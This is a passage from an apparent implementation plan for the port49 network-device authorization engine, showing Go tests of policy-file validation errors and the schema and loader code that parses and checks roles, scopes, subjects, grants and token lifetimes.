		{"an unknown key", scopeOK + roleOK + subjOK + "gratns: []\n", "field gratns not found"},
		{"a second document", scopeOK + roleOK + subjOK + grantOK + "---\nscopes: []\n", "one YAML document"},
		{"an empty file", "", "declares no subjects"},
		{"a duration with no unit", roleOK + "subjects:\n  - {name: s, identity: [\"user:a@example.com\"], username: a, token_ttl: 60}\n", "need a unit"},
		{"a level missing a reserved name", "privilege_levels: [{name: readonly}, {name: admin}]\n" + subjOK, "must list operator"},
		{"a reserved level with a parent", "privilege_levels: [{name: readonly, parent: admin}, {name: operator}, {name: admin}]\n" + subjOK, "reserved"},
		{"an undeclared parent", "privilege_levels: [{name: readonly}, {name: x, parent: y}, {name: operator}, {name: admin}]\n" + subjOK, "parent \"y\""},
		{"a parent cycle", "privilege_levels: [{name: readonly}, {name: x, parent: y}, {name: y, parent: x}, {name: operator}, {name: admin}]\n" + subjOK, "cycle"},
		{"an unknown level", "roles:\n  - {name: r, privilege: root}\n" + subjOK, "not a privilege level"},
		{"a duplicate role", "roles:\n  - {name: r}\n  - {name: r}\n" + subjOK, "declared twice"},
		{"a non-trailing **", "roles:\n  - {name: r, permit: [\"show ** detail\"]}\n" + subjOK, "trailing-only"},
		{"a regex that is *", "roles:\n  - {name: r, permit: [\"show /^.*$/\"]}\n" + subjOK, "is `*`"},
		{"a regex that is a word", "roles:\n  - {name: r, deny: [\"/^reload$/ **\"]}\n" + subjOK, "the word `reload`"},
		{"a bad pipe rule", "roles:\n  - {name: r, pipe: {permit: [\"inc*\"]}}\n" + subjOK, "pipe"},
		{"an attribute with no separator", "roles:\n  - {name: r, attributes: {all: [idletime]}}\n" + subjOK, "separator"},
		{"an attribute for no platform", "roles:\n  - {name: r, attributes: {junos: [\"idletime*30\"]}}\n" + subjOK, "neither `all`"},
		{"an unknown substitution", "roles:\n  - {name: r, attributes: {all: [\"home*{home}\"]}}\n" + subjOK, "not a substitution"},
		{"a scope match comparison", "scopes:\n  - {name: x, match: {os_version: {newer: \"1\"}}}\n" + subjOK, "not a comparison"},
		{"a scope regex RE2 refuses", "scopes:\n  - {name: x, match: {site: {re: \"(?!x)\"}}}\n" + subjOK, "match.site.re"},
		{"on_missing", "scopes:\n  - {name: x, match: {site: dc1}, on_missing: maybe}\n" + subjOK, "include or exclude"},
		{"a deny-bearing scope without on_missing", roleOK + "  - {name: d, deny: [reload]}\n" +
			"scopes:\n  - {name: x, match: {site: dc1}, attached_roles: {humans: [d]}}\n" + subjOK, "declare on_missing"},
		{"an undeclared attached role", "scopes:\n  - {name: x, match: {}, attached_roles: {machines: [nope]}}\n" + subjOK, "attached_roles.machines"},
		{"a group and identities", roleOK + "subjects:\n  - {name: s, group: G, identity: [\"user:a@example.com\"], username: a, token_ttl: 60s}\n", "not both"},
		{"neither", roleOK + "subjects:\n  - {name: s, username: a, token_ttl: 60s}\n", "group or an identity"},
		{"a group with a username", roleOK + "subjects:\n  - {name: s, group: G, username: a, token_ttl: 60s}\n", "from the directory"},
		{"a human and a machine", roleOK + "subjects:\n  - {name: s, identity: [\"user:a@example.com\", \"app:ci\"], username: a, token_ttl: 60s}\n", "trust domains"},
		{"an identity in no form", roleOK + "subjects:\n  - {name: s, identity: [\"alice\"], username: a, token_ttl: 60s}\n", "no recognized form"},
		{"an upper-case identity", roleOK + "subjects:\n  - {name: s, identity: [\"user:Alice@Example.com\"], username: a, token_ttl: 60s}\n", `write "user:alice@example.com"`},
		{"one identity, two subjects", roleOK + subjOK + "  - {name: t, identity: [\"user:a@example.com\"], username: b, token_ttl: 60s}\n", "listed by both"},
		{"a machine without a username", roleOK + "subjects:\n  - {name: s, identity: \"app:ci\", token_ttl: 60s}\n", "username is required"},
		{"a non-canonical username", roleOK + "subjects:\n  - {name: s, identity: [\"user:a@example.com\"], username: 'CORP\\alice', token_ttl: 60s}\n", "already canonical"},
		{"a shared username", roleOK + subjOK + "  - {name: t, identity: [\"user:b@example.com\"], username: a, token_ttl: 60s}\n", "unique across"},
		{"enable nonsense", roleOK + "subjects:\n  - {name: s, identity: [\"user:a@example.com\"], username: a, enable: maybe, token_ttl: 60s}\n", "none, auto or token"},
		{"a short token_ttl", roleOK + "subjects:\n  - {name: s, identity: [\"user:a@example.com\"], username: a, token_ttl: 10s}\n", "between 30s and 15m0s"},
		{"an unknown api right", roleOK + "subjects:\n  - {name: s, identity: [\"user:a@example.com\"], username: a, token_ttl: 60s, api: [root]}\n", "not a right"},
		{"all_devices undeclared", roleOK + subjOK + grantOK, "add `scopes: [{name: all_devices"},
		{"an undeclared scope", scopeOK + roleOK + subjOK + "grants:\n  - {subject: s, scope: dc, roles: [r]}\n", `scope "dc"`},
		{"a grant to nobody", scopeOK + roleOK + subjOK + "grants:\n  - {subject: x, scope: all_devices, roles: [r]}\n", `subject "x"`},
		{"a grant with no roles", scopeOK + roleOK + subjOK + "grants:\n  - {subject: s, scope: all_devices}\n", "at least one role"},
		{"an undeclared role", scopeOK + roleOK + subjOK + "grants:\n  - {subject: s, scope: all_devices, roles: [x]}\n", `role "x"`},
		{"a bad max_privilege", scopeOK + roleOK + subjOK + "grants:\n  - {subject: s, scope: all_devices, roles: [r], max_privilege: root}\n", "max_privilege"},
		{"a bad expiry", scopeOK + roleOK + subjOK + "grants:\n  - {subject: s, scope: all_devices, roles: [r], expires: soon}\n", "expires"},
		{"a test with both", scopeOK + roleOK + subjOK + grantOK + "tests:\n  - {subject: s, principal: p, device: leaf-01, command: x, expect: permit}\n", "one of the two"},
		{"a test on no device", scopeOK + roleOK + subjOK + grantOK + "tests:\n  - {subject: s, device: nowhere, command: x, expect: permit}\n", "not in the inventory"},
		{"a test expecting maybe", scopeOK + roleOK + subjOK + grantOK + "tests:\n  - {subject: s, device: leaf-01, command: x, expect: maybe}\n", "permit or deny"},
	} {
		t.Run(tt.name, func(t *testing.T) {
			_, err := Parse([]byte(tt.yaml), env())
			if err == nil || !strings.Contains(err.Error(), tt.want) {
				t.Fatalf("Parse = %v, want an error containing %q", err, tt.want)
			}
		})
	}
}

// Declaring privilege_levels replaces the ordering, and a custom level may
// hang off a reserved one (spec §6).
func TestCustomLevelsReplaceTheOrdering(t *testing.T) {
	p := mustParse(t, `
privilege_levels:
  - {name: readonly}
  - {name: read_only_limited, parent: readonly}
  - {name: operator}
  - {name: senior_operator, parent: operator}
  - {name: admin}
roles:
  - {name: r, privilege: senior_operator}
`+subjOK)
	if strings.Join(p.levels, " ") != "readonly read_only_limited operator senior_operator admin" ||
		p.parents["senior_operator"] != "operator" {
		t.Fatalf("levels %q parents %v", p.levels, p.parents)
	}
}
```

- [ ] **Step 2: Run them to see them fail**

Run: `go test ./internal/policy/ -count=1`
Expected: FAIL to build — `undefined: Env`, `undefined: Parse`, `undefined: Load`.

- [ ] **Step 3: Write the schema, the loader and the rank lint**

<!-- write: internal/policy/file.go -->
```go
package policy

import (
	"fmt"
	"time"

	"gopkg.in/yaml.v3"
)

// The policy file's schema (spec §11), snake_case throughout. Every key is
// declared: the decoder refuses one it does not know rather than ignoring it,
// because an ignored key is a policy that reads one way and runs another.
type file struct {
	PrivilegeLevels []fileLevel   `yaml:"privilege_levels"`
	Scopes          []fileScope   `yaml:"scopes"`
	Roles           []fileRole    `yaml:"roles"`
	Subjects        []fileSubject `yaml:"subjects"`
	Grants          []fileGrant   `yaml:"grants"`
	Tests           []fileTest    `yaml:"tests"`
}

type fileLevel struct {
	Name   string `yaml:"name"`
	Parent string `yaml:"parent"`
}

type fileScope struct {
	Name          string                `yaml:"name"`
	Match         map[string]matchValue `yaml:"match"`
	OnMissing     string                `yaml:"on_missing"`
	SecurityLog   bool                  `yaml:"security_log"`
	AttachedRoles fileAttached          `yaml:"attached_roles"`
}

type fileAttached struct {
	Humans   []string `yaml:"humans"`
	Machines []string `yaml:"machines"`
}

type fileRole struct {
	Name       string              `yaml:"name"`
	Privilege  string              `yaml:"privilege"`
	Reason     string              `yaml:"reason"`
	Permit     []string            `yaml:"permit"`
	Deny       []string            `yaml:"deny"`
	Pipe       *filePipe           `yaml:"pipe"`
	Attributes map[string][]string `yaml:"attributes"`
}

type filePipe struct {
	Permit []string `yaml:"permit"`
}

type fileSubject struct {
	Name     string        `yaml:"name"`
	Group    string        `yaml:"group"`
	Identity stringList    `yaml:"identity"`
	Username string        `yaml:"username"`
	Enable   string        `yaml:"enable"`
	TokenTTL time.Duration `yaml:"token_ttl"`
	API      []string      `yaml:"api"`
}

type fileGrant struct {
	Subject      string              `yaml:"subject"`
	Scope        string              `yaml:"scope"`
	Roles        []string            `yaml:"roles"`
	MaxPrivilege string              `yaml:"max_privilege"`
	Expires      string              `yaml:"expires"`
	Attributes   map[string][]string `yaml:"attributes"`
}

type fileTest struct {
	Subject   string `yaml:"subject"`
	Principal string `yaml:"principal"`
	Device    string `yaml:"device"`
	Command   string `yaml:"command"`
	Expect    string `yaml:"expect"`
	Reason    string `yaml:"reason"`
}

// stringList is a YAML scalar or a sequence of scalars: spec §11 writes one
// identity as a string and spec §2 writes several as a list.
type stringList []string

func (s *stringList) UnmarshalYAML(n *yaml.Node) error {
	if n.Kind == yaml.ScalarNode {
		*s = stringList{n.Value}
		return nil
	}
	var list []string
	if err := n.Decode(&list); err != nil {
		return err
	}
	*s = list
	return nil
}

// matchValue is one scope match term (spec §5.5): a scalar is equality, a
// sequence is any one of its values, and a mapping is a comparison — `lt`,
// `lte`, `gt`, `gte` against a version with the generic comparator, or `re`
// against an RE2 pattern. Several comparisons in one mapping must all hold.
type matchValue struct {
	Equal []string
	Cmp   map[string]string
}

func (m *matchValue) UnmarshalYAML(n *yaml.Node) error {
	switch n.Kind {
	case yaml.ScalarNode:
		m.Equal = []string{n.Value}
	case yaml.SequenceNode:
		if err := n.Decode(&m.Equal); err != nil {
			return err
		}
		if len(m.Equal) == 0 {
			return fmt.Errorf("line %d: an empty list matches no device", n.Line)
		}
	case yaml.MappingNode:
		if err := n.Decode(&m.Cmp); err != nil {
			return err
		}
		if len(m.Cmp) == 0 {
			return fmt.Errorf("line %d: an empty comparison matches no device", n.Line)
		}
		for op := range m.Cmp {
			switch op {
			case "lt", "lte", "gt", "gte", "re":
			default:
				return fmt.Errorf("line %d: %q is not a comparison; use lt, lte, gt, gte or re", n.Line, op)
			}
		}
	default:
		return fmt.Errorf("line %d: a match value is a string, a list or a comparison", n.Line)
	}
	return nil
}
```

<!-- write: internal/policy/load.go -->
```go
// Package policy is the policy engine's authoring half (spec §2–§6, §11): it
// loads the policy file, resolves a principal on a device into the grants,
// roles and ceilings that apply (spec §5.1), and compiles the result into the
// blob internal/engine decides with. The broker mints from it; `port49
// explain`, `port49 policy test`, `port49 access review` and `port49 grants
// remove` read it offline. The daemon never does: it has the blob.
package policy

import (
	"bytes"
	"errors"
	"fmt"
	"io"
	"os"
	"regexp"
	"slices"
	"strings"
	"time"

	"gopkg.in/yaml.v3"

	"github.com/rhwendt/port49/internal/admission"
	"github.com/rhwendt/port49/internal/engine"
	"github.com/rhwendt/port49/internal/platform"
	"github.com/rhwendt/port49/internal/token"
)

// Env is what a policy is loaded against. The joint checks of spec §6 and §10
// — a class a platform does not define, a level it cannot render, `enable:
// auto` where the enable exchange carries no principal — are questions about
// the platforms actually present, so they run over the inventory.
type Env struct {
	// Devices is the inventory: the file inventory the daemon admits from,
	// until plan 6's bundle.
	Devices []admission.Device
	// Dialects replaces the built-in platform table when non-nil. Tests use it;
	// plan 5's layered adapters will too.
	Dialects map[string]platform.Dialect
	// EnableUsernames is config's resolved table (config.Config); a platform
	// with no entry is `principal`.
	EnableUsernames map[string]string
}

// Policy is a loaded, validated policy file.
type Policy struct {
	// Bundle names this policy on every blob and record: the sha256 of the
	// file's bytes, until plan 6 publishes versioned bundles (spec §5.7).
	Bundle string

	levels  []string          // the declared ordering, lowest first
	parents map[string]string // level → parent, for rendering
	scopes  map[string]*Scope
	roles   map[string]*Role
	subs    map[string]*Subject
	byID    map[string]string // identity → subject
	grants  []*Grant
	tests   []Test
	env     Env
}

// Scope selects devices by their inventory attributes (spec §5.5).
type Scope struct {
	Name        string
	Match       map[string]matchValue
	OnMissing   string // "include" | "exclude"
	SecurityLog bool
	Attached    map[string][]string // "humans" | "machines" → roles
	res         map[string]*regexp.Regexp
}

// Role is a named set of rules, an optional level, and attributes (spec §6).
type Role struct {
	Name       string
	Privilege  string
	Reason     string
	Permit     []string
	Deny       []string
	Pipe       []string // nil: the shipped default
	Attributes map[string][]string
}

// Subject addresses a set of principals (spec §2).
type Subject struct {
	Name     string
	Group    string
	Identity []string
	Domain   string // "humans" | "machines", the key attached_roles uses
	Username string
	Enable   string
	TokenTTL time.Duration
	API      []string
}

// Grant is one flat row: subject × scope × roles (spec §13, decision 2).
type Grant struct {
	Subject      string
	Scope        string
	Roles        []string
	MaxPrivilege string
	Expires      time.Time // zero: never
	Attributes   map[string][]string
}

// Test is one `tests:` entry (spec §11, §12).
type Test struct {
	Subject, Principal, Device, Command, Expect, Reason string
}

// DefaultPipe is the output-modifier allowlist every role inherits unless it
// declares its own (spec §4).
var DefaultPipe = []string{"include **", "exclude **", "begin **", "section **", "json", "count", "no-more"}

// reservedLevels ship built in and cannot be renamed or removed (spec §6).
var reservedLevels = []string{"readonly", "operator", "admin"}

var apiRights = []string{"revoke_others", "explain_others", "sync", "keys_show", "replay"}

// Design §8: device tokens live 30–900s.
const (
	minTokenTTL = 30 * time.Second
	maxTokenTTL = 900 * time.Second
)

// Load reads and validates the policy file at path against env. Every error
// names the file and what to change.
func Load(path string, env Env) (*Policy, error) {
	raw, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("policy: %w", err)
	}
	p, err := Parse(raw, env)
	if err != nil {
		return nil, fmt.Errorf("policy: %s: %w", path, err)
	}
	return p, nil
}

// Parse validates a policy file's bytes against env.
func Parse(raw []byte, env Env) (*Policy, error) {
	if err := refusedKeys(raw); err != nil {
		return nil, err
	}
	var f file
	dec := yaml.NewDecoder(bytes.NewReader(raw))
	dec.KnownFields(true)
	if err := dec.Decode(&f); err != nil && err != io.EOF {
		if strings.Contains(err.Error(), "time.Duration") {
			return nil, fmt.Errorf("%w; durations need a unit, e.g. 60s", err)
		}
		return nil, err
	}
	// A second document would be ignored by a single Decode, and an ignored
	// `---` followed by a `scopes:` block is a policy that reads as scoped and
	// is not.
	if err := dec.Decode(&struct{}{}); err != io.EOF {
		return nil, errors.New("the policy file must be one YAML document; remove the `---` separator and " +
			"everything after it, or merge it into the first document")
	}
	p := &Policy{Bundle: engine.HashOf(raw), env: env}
	for _, step := range []func(file) error{p.buildLevels, p.buildRoles, p.buildScopes, p.buildSubjects,
		p.buildGrants, p.buildTests} {
		if err := step(f); err != nil {
			return nil, err
		}
	}
	// An empty policy fails closed, but a truncated file or the wrong one would
	// go unnoticed until the first refused mint.
	if len(p.subs) == 0 {
		return nil, errors.New("declares no subjects, so nobody can mint; is this the right file?")
	}
	return p, nil
}

// refusedKeys names the plan that reads a key this build does not, before the
// strict decode can say only that the field is unknown. Spec §11's example
// carries two of them.
func refusedKeys(raw []byte) error {
	var loose struct {
		PlatformSet any              `yaml:"platform_set"`
		KeyGroups   any              `yaml:"key_groups"`
		Platforms   any              `yaml:"platforms"`
		Roles       []map[string]any `yaml:"roles"`
	}
	if err := yaml.Unmarshal(raw, &loose); err != nil {
		return nil // the strict decode reports it, with a line number
	}
	switch {
	case loose.PlatformSet != nil:
		return errors.New("platform_set: pinning the platform set is plan 5's; remove the key until it lands")
	case loose.KeyGroups != nil:
		return errors.New("key_groups: key groups live in the inventory file (inventory_file) until plan 6 " +
			"moves them to the policy repository; move the block there")
	case loose.Platforms != nil:
		return errors.New("platforms: user platform definitions are plan 5's; the built-in adapters apply")
	}
	for _, r := range loose.Roles {
		if _, ok := r["max_session_age"]; ok {
			return fmt.Errorf("role %v: max_session_age per role is plan 7's; session.max_session_age_default "+
				"in port49d.yaml applies to every role until then", r["name"])
		}
	}
	return nil
}

func (p *Policy) buildLevels(f file) error {
	p.parents = map[string]string{}
	if len(f.PrivilegeLevels) == 0 {
		p.levels = append([]string(nil), reservedLevels...)
		return nil
	}
	seen := map[string]bool{}
	for i, l := range f.PrivilegeLevels {
		switch {
		case l.Name == "":
			return fmt.Errorf("privilege_levels[%d]: name is required", i)
		case seen[l.Name]:
			return fmt.Errorf("privilege level %q is declared twice", l.Name)
		case l.Parent != "" && slices.Contains(reservedLevels, l.Name):
			return fmt.Errorf("privilege level %q is reserved and has no parent: it is what a parent chain ends at", l.Name)
		}
		seen[l.Name] = true
		p.levels = append(p.levels, l.Name)
		if l.Parent != "" {
			p.parents[l.Name] = l.Parent
		}
	}
	for _, r := range reservedLevels {
		if !seen[r] {
			return fmt.Errorf("privilege_levels must list %s: readonly, operator and admin are reserved and cannot "+
				"be removed, so every shipped platform keeps working (spec §6); put them where they belong in the order", r)
		}
	}
	for name, parent := range p.parents {
		if !seen[parent] {
			return fmt.Errorf("privilege level %q: parent %q is not declared", name, parent)
		}
	}
	for name := range p.parents {
		cur, hops := name, 0
		for p.parents[cur] != "" {
			cur = p.parents[cur]
			if hops++; hops > len(p.levels) {
				return fmt.Errorf("privilege level %q: its parent chain is a cycle", name)
			}
		}
	}
	return nil
}

func (p *Policy) checkLevel(name string) error {
	if name == "" || slices.Contains(p.levels, name) {
		return nil
	}
	return fmt.Errorf("%q is not a privilege level; the levels are %s", name, strings.Join(p.levels, ", "))
}

func (p *Policy) buildRoles(f file) error {
	p.roles = map[string]*Role{}
	for i, r := range f.Roles {
		if r.Name == "" {
			return fmt.Errorf("roles[%d]: name is required", i)
		}
		if _, dup := p.roles[r.Name]; dup {
			return fmt.Errorf("role %q is declared twice", r.Name)
		}
		if err := p.checkLevel(r.Privilege); err != nil {
			return fmt.Errorf("role %q: privilege: %w", r.Name, err)
		}
		role := &Role{Name: r.Name, Privilege: r.Privilege, Reason: r.Reason, Attributes: r.Attributes}
		for _, list := range []struct {
			in  []string
			out *[]string
		}{{r.Permit, &role.Permit}, {r.Deny, &role.Deny}} {
			for _, rule := range list.in {
				if err := checkRule(rule); err != nil {
					return fmt.Errorf("role %q: %w", r.Name, err)
				}
				*list.out = append(*list.out, engine.CanonicalRule(rule))
			}
		}
		if r.Pipe != nil {
			role.Pipe = []string{}
			for _, rule := range r.Pipe.Permit {
				if err := checkRule(rule); err != nil {
					return fmt.Errorf("role %q: pipe: %w", r.Name, err)
				}
				role.Pipe = append(role.Pipe, engine.CanonicalRule(rule))
			}
		}
		if err := p.checkAttributes(r.Attributes); err != nil {
			return fmt.Errorf("role %q: %w", r.Name, err)
		}
		p.roles[r.Name] = role
	}
	return nil
}

// checkRule parses a rule and refuses a regex that buys specificity by how it
// is written rather than by what it constrains (spec §4; §14, "Rank lint"):
// one equivalent to `*` ranks 2 where `*` ranks 1, and one equivalent to a
// literal ranks 2 where the word ranks 3.
func checkRule(rule string) error {
	terms, err := engine.ParseRule(rule)
	if err != nil {
		return err
	}
	for _, t := range terms {
		if t.Kind != engine.Regex {
			continue
		}
		if simpler, ok := rankLint(t.Text); ok {
			return fmt.Errorf("rule %q: /%s/ is %s; write that instead (spec §4)", rule, t.Text, simpler)
		}
	}
	return nil
}

// checkAttributes validates an attribute block: keyed by `all` or by a
// platform port49 ships or the inventory names, each attribute structurally
// valid (engine.CheckAttribute).
func (p *Policy) checkAttributes(attrs map[string][]string) error {
	for key, list := range attrs {
		if key != "all" && !platform.Known(key) && !p.inInventory(key) {
			return fmt.Errorf("attributes: %q is neither `all` nor a platform port49 ships or the inventory names", key)
		}
		for _, a := range list {
			if err := engine.CheckAttribute(a); err != nil {
				return fmt.Errorf("attributes.%s: %w", key, err)
			}
		}
	}
	return nil
}

func (p *Policy) inInventory(platformName string) bool {
	for _, d := range p.env.Devices {
		if d.Platform == platformName {
			return true
		}
	}
	return false
}

func (p *Policy) buildScopes(f file) error {
	p.scopes = map[string]*Scope{}
	for i, s := range f.Scopes {
		if s.Name == "" {
			return fmt.Errorf("scopes[%d]: name is required", i)
		}
		if _, dup := p.scopes[s.Name]; dup {
			return fmt.Errorf("scope %q is declared twice", s.Name)
		}
		sc := &Scope{Name: s.Name, Match: s.Match, OnMissing: s.OnMissing, SecurityLog: s.SecurityLog,
			Attached: map[string][]string{"humans": s.AttachedRoles.Humans, "machines": s.AttachedRoles.Machines},
			res:      map[string]*regexp.Regexp{}}
		for key, v := range s.Match {
			if key == "" {
				return fmt.Errorf("scope %q: a match key is empty", s.Name)
			}
			for op, bound := range v.Cmp {
				if op == "re" {
					re, err := regexp.Compile(bound)
					if err != nil {
						return fmt.Errorf("scope %q: match.%s.re: %w", s.Name, key, err)
					}
					sc.res[key] = re
				} else if bound == "" {
					return fmt.Errorf("scope %q: match.%s.%s needs a version to compare against", s.Name, key, op)
				}
			}
		}
		deny := false
		for _, domain := range []string{"humans", "machines"} {
			for _, r := range sc.Attached[domain] {
				role, ok := p.roles[r]
				if !ok {
					return fmt.Errorf("scope %q: attached_roles.%s: role %q is not declared", s.Name, domain, r)
				}
				deny = deny || len(role.Deny) > 0
			}
		}
		switch s.OnMissing {
		case "include", "exclude":
		case "":
			// A deny-bearing scope that silently excludes a device with no
			// version data lifts a mitigation on a broken sync (spec §5.5), so
			// the direction has to be written down, not defaulted.
			if deny {
				return fmt.Errorf("scope %q attaches a deny: declare on_missing (include assumes a device with no "+
					"data for the match is affected, which is the safe direction for a mitigation; spec §5.5)", s.Name)
			}
			sc.OnMissing = "exclude"
		default:
			return fmt.Errorf("scope %q: on_missing is include or exclude, not %q", s.Name, s.OnMissing)
		}
		p.scopes[s.Name] = sc
	}
	return nil
}

var serviceAccount = regexp.MustCompile(`^system:serviceaccount:[^:\s]+:[^:\s]+$`)

// identityDomain classifies an identity string by its form (spec §2), which is
// how CI tells a human from a machine without a verifier to ask. A string in
// no recognized form is itself a load error.
func identityDomain(id string) (string, error) {
	if strings.IndexFunc(id, func(r rune) bool { return r < 0x21 || r > 0x7e }) >= 0 {
		return "", fmt.Errorf("identity %q must be printable ASCII with no spaces", id)
	}
	switch {
	case strings.HasPrefix(id, "user:") && len(id) > len("user:"):
		email := strings.TrimPrefix(id, "user:")
		if !strings.Contains(email, "@") {
			return "", fmt.Errorf("identity %q: the one human verifier is an x509 certificate, whose principal is "+
				"`user:<email>` (spec §2)", id)
		}
		if lower := strings.ToLower(email); lower != email {
			return "", fmt.Errorf("identity %q must be lower-case, because certificate identities are compared "+
				"lower-case: write \"user:%s\"", id, lower)
		}
		return "humans", nil
	case strings.HasPrefix(id, "spiffe://") && len(id) > len("spiffe://"),
		serviceAccount.MatchString(id),
		strings.HasPrefix(id, "app:") && len(id) > len("app:"):
		return "machines", nil
	}
	return "", fmt.Errorf("identity %q is in no recognized form: user:<email>, spiffe://…, "+
		"system:serviceaccount:<namespace>:<name>, or app:<client_id> (spec §2)", id)
}

func (p *Policy) buildSubjects(f file) error {
	p.subs, p.byID = map[string]*Subject{}, map[string]string{}
	users := map[string]string{}
	for i, s := range f.Subjects {
		if s.Name == "" {
			return fmt.Errorf("subjects[%d]: name is required", i)
		}
		if _, dup := p.subs[s.Name]; dup {
			return fmt.Errorf("subject %q is declared twice", s.Name)
		}
		sub := &Subject{Name: s.Name, Group: s.Group, Identity: s.Identity, Username: s.Username,
			Enable: s.Enable, TokenTTL: s.TokenTTL, API: s.API}
		switch {
		case s.Group != "" && len(s.Identity) > 0:
			return fmt.Errorf("subject %q: a subject is a group or a list of identities, not both (spec §2)", s.Name)
		case s.Group == "" && len(s.Identity) == 0:
			return fmt.Errorf("subject %q: give it a group or an identity list (spec §2)", s.Name)
		case s.Group != "":
			// A group is resolved through the directory, whose members are
			// people, and each member's username comes from the same query
			// (spec §2). Declaring one would give every member the same name.
			sub.Domain = "humans"
			if s.Username != "" {
				return fmt.Errorf("subject %q: a group's usernames come from the directory, one per member; "+
					"remove username", s.Name)
			}
		}
		for _, id := range s.Identity {
			domain, err := identityDomain(id)
			if err != nil {
				return fmt.Errorf("subject %q: %w", s.Name, err)
			}
			if sub.Domain != "" && sub.Domain != domain {
				return fmt.Errorf("subject %q lists a human and a machine identity; trust domains must stay "+
					"distinguishable, so give each its own subject (spec §2)", s.Name)
			}
			sub.Domain = domain
			if other, dup := p.byID[id]; dup {
				if other == s.Name {
					return fmt.Errorf("identity %q is listed twice in subject %q; list it once", id, s.Name)
				}
				return fmt.Errorf("identity %q is listed by both subject %q and subject %q; a principal must "+
					"resolve to one subject", id, other, s.Name)
			}
			p.byID[id] = s.Name
		}
		if len(s.Identity) > 0 {
			// A machine has no directory entry, so it declares its username
			// (spec §2). A literal human identity declares one too until plan 7
			// derives it through the certificate-to-directory mapping.
			if s.Username == "" {
				return fmt.Errorf("subject %q: username is required: an identity-list subject has no directory to "+
					"derive one from (spec §2; §14, \"Username resolution\")", s.Name)
			}
			if !token.CanonicalUsername(s.Username) {
				return fmt.Errorf("subject %q: username %q must be printable ASCII and already canonical — lower "+
					"case, no DOMAIN\\ prefix, no @suffix — because the daemon looks tokens up by the canonical form "+
					"of what the device sends (spec §2)", s.Name, s.Username)
			}
			if other, dup := users[s.Username]; dup {
				return fmt.Errorf("subjects %q and %q both claim username %q; usernames must be unique across "+
					"subjects, or two principals share one (nas, username) context (spec §2)", other, s.Name, s.Username)
			}
			users[s.Username] = s.Name
		}
		switch s.Enable {
		case "":
			sub.Enable = "none"
		case "none", "token", "auto":
		default:
			return fmt.Errorf("subject %q: enable %q: it must be none, auto or token (spec §7)", s.Name, s.Enable)
		}
		if s.TokenTTL < minTokenTTL || s.TokenTTL > maxTokenTTL {
			return fmt.Errorf("subject %q: token_ttl must be between %s and %s (design §8); got %s",
				s.Name, minTokenTTL, maxTokenTTL, s.TokenTTL)
		}
		for _, r := range s.API {
			if !slices.Contains(apiRights, r) {
				return fmt.Errorf("subject %q: api: %q is not a right; the rights are %s", s.Name, r,
					strings.Join(apiRights, ", "))
			}
		}
		p.subs[s.Name] = sub
	}
	return nil
}

// parseExpires reads a grant's `expires`: a date is the start of that day,
// UTC — the grant has stopped matching by the time the day begins — and a
// full RFC 3339 time is exact.
func parseExpires(s string) (time.Time, error) {
	if t, err := time.Parse("2006-01-02", s); err == nil {
		return t, nil
	}
	return time.Parse(time.RFC3339, s)
}

func (p *Policy) buildGrants(f file) error {
	for i, g := range f.Grants {
		if _, ok := p.subs[g.Subject]; !ok {
			return fmt.Errorf("grants[%d]: subject %q is not declared", i, g.Subject)
		}
		if _, ok := p.scopes[g.Scope]; !ok {
			if g.Scope == "all_devices" {
				return fmt.Errorf("grants[%d]: scope all_devices is not declared; it is an ordinary scope since "+
					"plan 4 (spec §5.5) — add `scopes: [{name: all_devices, match: {}}]`", i)
			}
			return fmt.Errorf("grants[%d]: scope %q is not declared", i, g.Scope)
		}
		if len(g.Roles) == 0 {
			return fmt.Errorf("grants[%d]: a grant needs at least one role", i)
		}
		for _, r := range g.Roles {
			if _, ok := p.roles[r]; !ok {
				return fmt.Errorf("grants[%d]: role %q is not declared", i, r)
			}
		}
		if err := p.checkLevel(g.MaxPrivilege); err != nil {
			return fmt.Errorf("grants[%d]: max_privilege: %w", i, err)
		}
		grant := &Grant{Subject: g.Subject, Scope: g.Scope, Roles: g.Roles, MaxPrivilege: g.MaxPrivilege,
			Attributes: g.Attributes}
		if g.Expires != "" {
			t, err := parseExpires(g.Expires)
			if err != nil {
				return fmt.Errorf("grants[%d]: expires %q: a date (2026-12-01) or an RFC 3339 time", i, g.Expires)
			}
			grant.Expires = t
		}
		if err := p.checkAttributes(g.Attributes); err != nil {
			return fmt.Errorf("grants[%d]: %w", i, err)
		}
		p.grants = append(p.grants, grant)
	}
	return nil
}

func (p *Policy) buildTests(f file) error {
	for i, t := range f.Tests {
		switch {
		case (t.Subject == "") == (t.Principal == ""):
			return fmt.Errorf("tests[%d]: name a subject or a principal, one of the two", i)
		case t.Subject != "" && p.subs[t.Subject] == nil:
			return fmt.Errorf("tests[%d]: subject %q is not declared", i, t.Subject)
		case t.Device == "":
			return fmt.Errorf("tests[%d]: device is required", i)
		case strings.TrimSpace(t.Command) == "":
			return fmt.Errorf("tests[%d]: command is required", i)
		case t.Expect != "permit" && t.Expect != "deny":
			return fmt.Errorf("tests[%d]: expect is permit or deny, not %q", i, t.Expect)
		}
		if _, ok := p.device(t.Device); !ok {
			return fmt.Errorf("tests[%d]: device %q is not in the inventory", i, t.Device)
		}
		p.tests = append(p.tests, Test(t))
	}
	return nil
}

func (p *Policy) device(name string) (admission.Device, bool) {
	for _, d := range p.env.Devices {
		if d.Name == name {
			return d, true
		}
	}
	return admission.Device{}, false
}

// dialect is the platform's dialect under this policy's environment.
func (p *Policy) dialect(name string) platform.Dialect {
	if p.env.Dialects != nil {
		if d, ok := p.env.Dialects[name]; ok {
			return d
		}
	}
	d, _ := platform.DialectFor(name)
	return d
}

// SubjectOf names the subject a principal resolves to, by its identity lists.
// A group subject is matched through the directory, which is plan 7's.
func (p *Policy) SubjectOf(principal string) (string, bool) {
	name, ok := p.byID[principal]
	return name, ok
}

// Subject returns a declared subject.
func (p *Policy) Subject(name string) (*Subject, bool) {
	s, ok := p.subs[name]
	return s, ok
}

// Grants returns the grant rows naming subject, in file order.
func (p *Policy) Grants(subject string) []*Grant {
	var out []*Grant
	for _, g := range p.grants {
		if g.Subject == subject {
			out = append(out, g)
		}
	}
	return out
}

// Devices is the inventory the policy was loaded against.
func (p *Policy) Devices() []admission.Device { return p.env.Devices }

// Tests returns the file's tests.
func (p *Policy) Tests() []Test { return p.tests }
```

<!-- write: internal/policy/rank.go -->
```go
package policy

import (
	"regexp/syntax"
	"strings"
)

// rankLint reports whether a regex term is only a costlier spelling of a
// simpler term, and which: `/^.*$/` is `*` and `/^show$/` is the word `show`,
